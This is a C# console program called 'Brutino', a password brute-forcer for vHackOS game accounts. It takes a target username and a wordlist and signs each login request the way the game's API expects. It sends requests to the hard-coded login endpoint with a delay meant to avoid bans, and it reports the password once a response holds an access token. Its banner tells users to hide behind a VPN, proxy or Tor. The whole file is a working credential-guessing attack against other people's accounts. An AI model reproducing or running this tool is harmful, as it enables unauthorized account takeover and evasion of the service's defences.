using System;
using System.Net;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Web;
using System.Threading;
using System.Text;
using System.Collections.Generic;

namespace Brutino
{
    class MainClass
    {
        public static int temp = 0;
        public static string wordlist;
        public static string username;
        public static DateTime today = DateTime.Now;
        public static string file = ($@"\brutino_logs\resume{today:dd-MM-yy}at{today:HH_mm_ss_mstt}.log");

        public static string CalculateMD5Hash(string input)
        {
            //Prepare md5 for get parameter pass formatting password itself with base64 jason string parameter: get user request

            MD5 md5 = System.Security.Cryptography.MD5.Create();

            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);

            byte[] hash = md5.ComputeHash(inputBytes);

            // step 2, convert byte array to hex string

            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < hash.Length; i++)

            {

                sb.Append(hash[i].ToString("x2"));

            }

            return sb.ToString();

        }

        public static void initial()
        {
            //Welcome dear user! Banner graphic
            Console.Title = "Brutino Vhackos bruteforcer";
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Clear();

            if (!Directory.Exists("brutino_logs"))
            {
                Directory.CreateDirectory("brutino_logs");
            }

            Console.ForegroundColor = ConsoleColor.DarkGreen;
            string gg = "" +
                "+-----------------------------------------------------------------------------+\n" +
                "| _    ____               __                 ____             __              |\n" +
                "|| |  / / /_  ____ ______/ /______  _____   / __ )_______  __/ /____  _____   |\n" +
                "|| | / / __ \\/ __ `/ ___/ //_/ __ \\/ ___/  / __  / ___/ / / / __/ _ \\/ ___/   |\n" +
                "|| |/ / / / / /_/ / /__/ ,< / /_/ (__  )  / /_/ / /  / /_/ / /_/  __/ /       |\n" +
                "||___/_/ /_/\\__,_/\\___/_/|_|\\____/____/  /_____/_/   \\__,_/\\__/\\___/_/        |\n" +
                "|                                                                             |\n" +
                "| Simple bruteforcer for vhackos accounts                                     |\n" +
                "| Coded By Angelo Rosa 2018                                                   |\n" +
                "| Use a Vpn or Proxy or Tor before to start the script                        |\n" +
                "+-----------------------------------------------------------------------------+\n";

            Console.Write(gg);
            Console.ForegroundColor = ConsoleColor.White;
        }

        public static void table_trying(string ip, string username, string line, int count, int tried, double tProgress)
        {

            //Write infos while bruteforcing
            Console.Clear();
            initial();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\n\t Your Ip\t");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine(ip);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Account\t");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("{0}", username);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Trying\t        ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(line);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Password count\t");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(count);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Attempts\t");
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine(tried);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Time elapsed\t");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine((int)tProgress + " minutes");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Progress\t");
            Console.ForegroundColor = ConsoleColor.Blue;
            double dProgress = ((double)tried / (double)count) * 100.0;
            Console.WriteLine((int)dProgress + "%");

            //Save results every 50 attempts you can change value of saves attempts
            if (tried == (temp + 50))
            {
                saveProgress(count,tried);
                temp = tried;
            }

        }

        public static void saveProgress(int count , int tried)
        {
            //Save Progress of attack
            string save = "position=" + tried + "\nfile=" + wordlist + "\nusername=" + username;
            File.WriteAllText(file, save);
        }

        public static void table_found(string username, double elapsed, string password)
        {
            //Well Done! Password found write results
            Console.Clear();
            initial();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\n\t Account\t");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("{0}", username);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Status Password ");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Found!");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Password\t");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(password);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Elapsed time\t");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine((int)elapsed + " minutes");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\n\n Type a key to exit");
            Console.ReadLine();
            System.Environment.Exit(1);

        }

        public static void table_not_found(string username, double elapsed)
        {
            //Ops, attack failed no results found
            Console.Clear();
            initial();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\n\t Account\t\t");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("{0}", username);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Status Password\t");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Not Found!");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Elapsed time\t\t");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine((int)elapsed + " minutes");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\n\n Type a key to exit");
            Console.ReadLine();
            System.Environment.Exit(1);

        }

        public static string Base64Encode(string plainText)
        {
            //Create Base64encode in order to format user get parameter for http request
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        public static void Main(string[] args)
        {
            initial();
            int count = 0, tried = 0;
            string respond, ip, choose, resume;
            string[] check_row;
            int position = 1    ;

            //Api VhackOs Url
            string api = "https://api.vhack.cc/mobile/15/login.php";

            //Api to get your ip address
            string api_ip = "https://ident.me";

            do
            {

                Console.Write("Start new Attack(1) or resume(2)? ");
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                choose = Console.ReadLine();

                if (choose == "2")
                {
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("Insert resuming file=> ");
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    resume = Console.ReadLine();

                    if (!File.Exists(resume))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("File not found! Quitting...");
                        System.Environment.Exit(4);
                    }
                    else
                    {
                        if (new FileInfo(resume).Length == 0)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("This file is empty! Quitting...");
                            System.Environment.Exit(4);
                        }
                        else
                        {
                            check_row = File.ReadAllLines(resume);
                            if (check_row[0].Contains("position=") && check_row[1].Contains("file=") && check_row[2].Contains("username="))
                            {
                                position = Int32.Parse(check_row[0].Replace("position=", ""));
                                wordlist = check_row[1].Replace("file=", "");
                                username = check_row[2].Replace("username=", "");
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("File is bad formatted! Quitting...");
                                System.Environment.Exit(4);
                            }
                        }
                    }
                }

            } while ((choose != "1" && choose != "2"));

            if (choose == "1")
            {
                do
                {
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("Username=> ");
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    username = Console.ReadLine();

                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("Wordlist patch=> ");
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    wordlist = Console.ReadLine();

                    if (!File.Exists(wordlist))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Wordlist not found, try again");
                        Console.ForegroundColor = ConsoleColor.White;
                    }

                } while (!File.Exists(wordlist));
            }

            Console.WriteLine("\nProcess starting please wait....");

            //Getting your ip address
            HttpWebRequest rew = (HttpWebRequest)WebRequest.Create(api_ip);
            rew.AutomaticDecompression = DecompressionMethods.GZip;

            using (HttpWebResponse res = (HttpWebResponse)rew.GetResponse())
            using (Stream str = res.GetResponseStream())
            using (StreamReader read = new StreamReader(str))
            {
                respond = read.ReadToEnd();
            }

            ip = respond;

            //Start the watch time to calculate time elapsed at the end
            var watch_for_this = System.Diagnostics.Stopwatch.StartNew();
            var progress = System.Diagnostics.Stopwatch.StartNew();


            string hash, jasonString, jasonBased, md5_jason_1, password, req, url;

            //The string of resquest in Jason Format
            string String = ("{\"username\":\"#replace#\", \"password\":\"#replace2#\",\"lastread\":\"0\",\"lang\":\"it\",\"verify\":\"False\"}");

            try
            {
                //Counting how many passwords in the file
                count = File.ReadAllLines(wordlist).Length;

                //using (var reader = new StreamReader(wordlist))
                //{
                //while (!reader.EndOfStream)
                for (int j = position-1; j <= count; j++)
                {
                    //Initializing strings of requests for every attempt
                    hash = string.Empty;
                    jasonString = string.Empty;
                    jasonBased = string.Empty;
                    md5_jason_1 = string.Empty;
                    password = string.Empty;
                    req = string.Empty;
                    try
                    {
                        var line = File.ReadAllLines(wordlist);

                        tried++;

                        var time = progress.Elapsed.TotalMinutes;

                        table_trying(ip, username, line[j], count, tried, time);

                        //Calculate MD5 hash of password
                        hash = CalculateMD5Hash(line[j]);
                        //Replacing signalers with username plaintext and password already md5 hashed
                        jasonString = String.Replace("#replace#", username).Replace("#replace2#", hash);

                        jasonBased = Base64Encode(jasonString);

                        //Calculating MD5 of the entire Jason string with username and passowrd replaced 
                        md5_jason_1 = CalculateMD5Hash(jasonString);

                        //Calculating the pass get parameter with the Jason string normal * 3 but the least must be the jason string in md5 calculated version
                        password = CalculateMD5Hash(jasonString + jasonString + md5_jason_1);

                        string html = string.Empty;
                        //Let's replace signalers with jason request base64encode and the calculated password as pass
                        req = "?user=#replace3#&pass=#replace4#";

                        url = api + req.Replace("#replace3#", jasonBased).Replace("#replace4#", password);

                        //Avoid banning by the server with this delay
                        Thread.Sleep(300);

                        //Start the request
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                        request.AutomaticDecompression = DecompressionMethods.GZip;

                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                        using (Stream stream = response.GetResponseStream())
                        using (StreamReader reader_2 = new StreamReader(stream))
                        {
                            //Saving the html (That's it's a jason response by the page) to a string
                            html = reader_2.ReadToEnd();
                        }

                        //Checking if jason response contains the accesstoken and uid, if yes you are logged in and you're password is correct
                        if (html.Contains("accesstoken") && html.Contains("uid"))
                        {
                            watch_for_this.Stop();
                            var ela = watch_for_this.Elapsed.TotalMinutes;
                            table_found(username, ela, line[j]);
                        }
                    }
                    catch (Exception)
                    {
                        if (j == count)
                        {
                            watch_for_this.Stop();
                            var elapsed = watch_for_this.Elapsed.TotalMinutes;
                            table_not_found(username, elapsed);
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("Unable to send requests anymore stopping.....\n");
                            System.Environment.Exit(3);
                        }
                    }

                }
                // }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Exception Occurred... Stopping. Wordlist format not accepted, or path file changed\n{0}", ex);
                Console.ReadLine();
                System.Environment.Exit(0);
            }
            //If you reach this point, you dind't able to find any password in that list... :(
        }
    }
}
